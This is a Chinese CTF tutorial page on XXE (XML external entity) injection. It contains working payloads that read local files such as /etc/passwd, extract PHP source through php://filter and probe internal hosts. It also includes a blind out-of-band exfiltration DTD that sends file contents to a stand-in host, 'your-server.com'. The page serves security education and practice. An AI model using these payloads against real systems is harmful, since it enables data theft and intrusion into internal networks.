---
title: XXE XML 外部实体注入
order: 8
icon: mdi:xml
category:
  - CTF
  - 手册
  - Web
---

XXE（XML External Entity，XML 外部实体注入）是指攻击者通过构造恶意 XML，让服务器解析外部实体，从而读取文件或发起内网请求。

## 漏洞原理

XML 支持"外部实体"——在 XML 里引用外部文件或 URL 的内容：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

如果服务器解析了这段 XML，`&xxe;` 就会被替换成 `/etc/passwd` 的内容。

## 基础 Payload

### 读取本地文件

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

```xml
<!-- 读取 flag -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<data>&xxe;</data>
```

### 读取 PHP 源码

PHP 文件直接读取会被执行，用 `php://filter` 转 base64：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<data>&xxe;</data>
```

### 探测内网

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
]>
<data>&xxe;</data>
```

## 无回显 XXE（Blind XXE）

服务器解析了 XML 但不返回实体内容时，用带外（OOB）技术把数据发出来：

**1. 在自己的服务器上放 `evil.dtd`**：

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://your-server.com/?data=%file;'>">
%oob;
```

**2. 发送给目标的 Payload**：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://your-server.com/evil.dtd">
  %dtd;
]>
<data>&exfil;</data>
```

目标服务器会向你的服务器发请求，URL 里带着 flag 内容。

## 如何找到 XXE 入口

- 请求中有 XML 格式的数据（`Content-Type: application/xml`）
- 上传 XML/SVG/DOCX/XLSX 文件的功能
- SOAP 接口
- 把 JSON 请求改成 XML 格式试试

::: note 课后练习
课后练习需要你连接校园网才能访问内网练习平台。
:::

## 课后练习

- [XML 里藏着什么](http://172.16.173.140/training/11?challenge=45) — 接口接受 XML 格式数据，利用外部实体读取服务器文件

## 练手资源

- CTFHub XXE 技能树
- PortSwigger Web Security Academy（XXE 模块）
